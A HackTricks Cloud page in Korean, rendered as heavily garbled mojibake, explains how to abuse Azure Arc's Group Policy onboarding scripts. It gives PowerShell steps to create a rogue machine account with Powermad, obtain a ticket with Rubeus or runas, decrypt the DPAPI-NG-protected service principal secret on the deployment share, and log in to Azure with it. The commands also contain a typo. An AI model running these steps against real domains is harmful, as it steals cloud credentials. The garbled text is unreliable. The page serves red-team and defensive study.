# Az - Azure Arc ì·¨ì•½í•œ GPO ë°°í¬ ìŠ¤í¬ë¦½íŠ¸

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œì—ì„œ ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

- **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
- [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
- ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
- **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

### ë¬¸ì œ ì‹ë³„

Azure ArcëŠ” ìƒˆë¡œìš´ ë‚´ë¶€ ì„œë²„(ë„ë©”ì¸ì— ê°€ì…ëœ ì„œë²„)ë¥¼ Azure Arcë¡œ í†µí•©í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ” Group Policy Object ë°©ë²•ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ë¥¼ ìš©ì´í•˜ê²Œ í•˜ê¸° ìœ„í•´ MicrosoftëŠ” ì˜¨ë³´ë”© í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹œì‘í•˜ëŠ” ë° í•„ìš”í•œ ë°°í¬ íˆ´í‚·ì„ ì œê³µí•©ë‹ˆë‹¤. ArcEnableServerGroupPolicy.zip íŒŒì¼ ë‚´ì—ëŠ” DeployGPO.ps1, EnableAzureArc.ps1 ë° AzureArcDeployment.psm1 ìŠ¤í¬ë¦½íŠ¸ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

DeployGPO.ps1 ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ë©´ ë‹¤ìŒ ì‘ì—…ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤:

1. ë¡œì»¬ ë„ë©”ì¸ ë‚´ì—ì„œ Azure Arc ì„œë²„ ì˜¨ë³´ë”© GPOë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
2. ì˜¨ë³´ë”© í”„ë¡œì„¸ìŠ¤ë¥¼ ìœ„í•´ ì§€ì •ëœ ë„¤íŠ¸ì›Œí¬ ê³µìœ ì— EnableAzureArc.ps1 ì˜¨ë³´ë”© ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë³µì‚¬í•©ë‹ˆë‹¤. ì´ ê³µìœ ì—ëŠ” Windows ì„¤ì¹˜ í”„ë¡œê·¸ë¨ íŒ¨í‚¤ì§€ë„ í¬í•¨ë©ë‹ˆë‹¤.

ì´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•  ë•Œ ì‹œìŠ¤í…œ ê´€ë¦¬ìëŠ” **ServicePrincipalId** ë° **ServicePrincipalClientSecret**ì™€ ê°™ì€ ë‘ ê°€ì§€ ì£¼ìš” ë§¤ê°œë³€ìˆ˜ë¥¼ ì œê³µí•´ì•¼ í•©ë‹ˆë‹¤. ë˜í•œ ë„ë©”ì¸, ê³µìœ ë¥¼ í˜¸ìŠ¤íŒ…í•˜ëŠ” ì„œë²„ì˜ FQDN ë° ê³µìœ  ì´ë¦„ê³¼ ê°™ì€ ë‹¤ë¥¸ ë§¤ê°œë³€ìˆ˜ë„ í•„ìš”í•©ë‹ˆë‹¤. ìŠ¤í¬ë¦½íŠ¸ì—ëŠ” í…Œë„ŒíŠ¸ ID, ë¦¬ì†ŒìŠ¤ ê·¸ë£¹ ë° ê¸°íƒ€ í•„ìš”í•œ ì •ë³´ë„ ì œê³µë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

AzureArcDeploy ë””ë ‰í† ë¦¬ì— DPAPI-NG ì•”í˜¸í™”ë¥¼ ì‚¬ìš©í•˜ì—¬ ì§€ì •ëœ ê³µìœ ì— ì•”í˜¸í™”ëœ ë¹„ë°€ì´ ìƒì„±ë©ë‹ˆë‹¤. ì•”í˜¸í™”ëœ ë¹„ë°€ì€ encryptedServicePrincipalSecretì´ë¼ëŠ” íŒŒì¼ì— ì €ì¥ë©ë‹ˆë‹¤. ì´ ì•”í˜¸í™”ëŠ” DeployGPO.ps1 ìŠ¤í¬ë¦½íŠ¸ì—ì„œ ìˆ˜í–‰ë˜ë©° $descriptor ë° $ServicePrincipalSecretì„ ì…ë ¥ìœ¼ë¡œ ì‚¬ìš©í•˜ì—¬ ProtectBase64ë¥¼ í˜¸ì¶œí•˜ì—¬ ìˆ˜í–‰ë©ë‹ˆë‹¤. ì„¤ëª…ìëŠ” ë„ë©”ì¸ ì»´í“¨í„° ë° ë„ë©”ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ ê·¸ë£¹ SIDë¡œ êµ¬ì„±ë˜ì–´ ìˆì–´ì„œ ServicePrincipalSecretë¥¼ ë„ë©”ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ ë° ë„ë©”ì¸ ì»´í“¨í„° ë³´ì•ˆ ê·¸ë£¹ë§Œì´ ë³µí˜¸í™”í•  ìˆ˜ ìˆë„ë¡ ë³´ì¥í•©ë‹ˆë‹¤. ì´ëŠ” ìŠ¤í¬ë¦½íŠ¸ ì£¼ì„ì— ì–¸ê¸‰ëœ ëŒ€ë¡œì…ë‹ˆë‹¤.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Exploit

ë‹¤ìŒê³¼ ê°™ì€ ì¡°ê±´ì´ ìˆìŠµë‹ˆë‹¤:

1. ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ì— ì„±ê³µì ìœ¼ë¡œ ì¹¨íˆ¬í–ˆìŠµë‹ˆë‹¤.
2. Active Directory ë‚´ì—ì„œ ì»´í“¨í„° ê³„ì •ì„ ìƒì„±í•˜ê±°ë‚˜ ì œì–´í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ì´ ìˆìŠµë‹ˆë‹¤.
3. AzureArcDeploy ë””ë ‰í† ë¦¬ë¥¼ í¬í•¨í•˜ëŠ” ë„¤íŠ¸ì›Œí¬ ê³µìœ ë¥¼ ë°œê²¬í–ˆìŠµë‹ˆë‹¤.

AD í™˜ê²½ ë‚´ì—ì„œ ì»´í“¨í„° ê³„ì •ì„ ì–»ëŠ” ì—¬ëŸ¬ ê°€ì§€ ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤. ê°€ì¥ ì¼ë°˜ì ì¸ ë°©ë²• ì¤‘ í•˜ë‚˜ëŠ” ì»´í“¨í„° ê³„ì • í• ë‹¹ëŸ‰ì„ ì•…ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œëŠ” ì·¨ì•½í•œ ACLì´ë‚˜ ë‹¤ì–‘í•œ ë‹¤ë¥¸ êµ¬ì„± ì˜¤ë¥˜ë¥¼ í†µí•´ ì»´í“¨í„° ê³„ì •ì„ compromiseí•˜ëŠ” ê²ƒì´ ìˆìŠµë‹ˆë‹¤.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
í•œ ë²ˆ ë¨¸ì‹  ê³„ì •ì„ íšë“í•˜ë©´ í•´ë‹¹ ê³„ì •ì„ ì‚¬ìš©í•˜ì—¬ ì¸ì¦í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. runas.exe ëª…ë ¹ì„ netonly í”Œë˜ê·¸ì™€ í•¨ê»˜ ì‚¬ìš©í•˜ê±°ë‚˜ Rubeus.exeë¥¼ ì‚¬ìš©í•˜ì—¬ pass-the-ticketì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
ì €í¬ ì»´í“¨í„° ê³„ì •ì˜ TGTê°€ ë©”ëª¨ë¦¬ì— ì €ì¥ë˜ì–´ ìˆìœ¼ë©´, ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œë¹„ìŠ¤ ì£¼ì²´ ë¹„ë°€ì„ ë³µí˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternatively, we can use [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

ì´ ì‹œì ì—ì„œ, ìš°ë¦¬ëŠ” Azureì— ì—°ê²°í•˜ê¸° ìœ„í•´ í•„ìš”í•œ ë‚˜ë¨¸ì§€ ì •ë³´ë¥¼ ìˆ˜ì§‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì •ë³´ëŠ” encryptedServicePrincipalSecret íŒŒì¼ê³¼ ë™ì¼í•œ ë„¤íŠ¸ì›Œí¬ ê³µìœ ì— ì €ì¥ëœ ArcInfo.json íŒŒì¼ì—ì„œ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ íŒŒì¼ì—ëŠ” TenantId, servicePrincipalClientId, ResourceGroup ë“±ì˜ ì„¸ë¶€ ì •ë³´ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ ì •ë³´ë¥¼ ì‚¬ìš©í•˜ì—¬ ìš°ë¦¬ëŠ” Azure CLIë¥¼ ì‚¬ìš©í•˜ì—¬ ì¹¨í•´ë‹¹í•œ ì„œë¹„ìŠ¤ í”„ë¦°ì‹œí„ë¡œ ì¸ì¦í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## References

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ ì œë¡œì—ì„œ ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

- **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
- [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ìš°ë¦¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
- **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜**íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
- **HackTricks** ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
